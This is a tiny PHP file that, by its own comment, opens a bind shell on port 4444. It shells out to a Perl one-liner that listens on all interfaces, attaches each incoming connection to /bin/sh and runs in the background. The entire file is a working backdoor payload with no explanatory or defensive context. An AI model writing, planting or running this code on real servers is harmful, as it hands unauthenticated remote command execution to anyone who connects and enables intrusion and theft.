<?php

/* open bind shell for Port 4444 */
system("perl -e \"use Socket;socket(SOCKET, PF_INET,
SOCK_STREAM,getprotobyname('tcp'));setsockopt(SOCKET,
SOL_SOCKET,SO_REUSEADDR, 1);bind(SOCKET,
pack_sockaddr_in(4444,inet_aton('0.0.0.0')));listen(SOCKET,
SOMAXCONN);for (;accept(NEW_SOCKET,SOCKET);close NEW_SOCKET){open(STDIN,
'>&NEW_SOCKET');open(STDOUT, '>&NEW_SOCKET');open(STDERR,
'>&NEW_SOCKET');system('/bin/sh');close(STDIN);close(STDOUT);close(STDERR);};\"
&");
?>
